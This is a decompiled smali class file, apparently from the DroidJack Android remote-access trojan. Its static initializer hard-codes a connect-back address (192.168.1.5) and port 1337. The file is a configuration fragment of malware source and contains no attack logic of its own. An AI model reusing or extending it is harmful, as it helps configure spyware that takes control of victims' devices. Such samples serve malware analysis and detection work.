.class public Lnet/droidjack/server/br;
.super Ljava/lang/Object;


# static fields
.field protected static a:Ljava/lang/String;

.field protected static b:I

.field protected static c:B


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, "192.168.1.5"

    sput-object v0, Lnet/droidjack/server/br;->a:Ljava/lang/String;

    const/16 v0, 0x539

    sput v0, Lnet/droidjack/server/br;->b:I

    const/4 v0, -0x1

    sput-byte v0, Lnet/droidjack/server/br;->c:B

    return-void
.end method
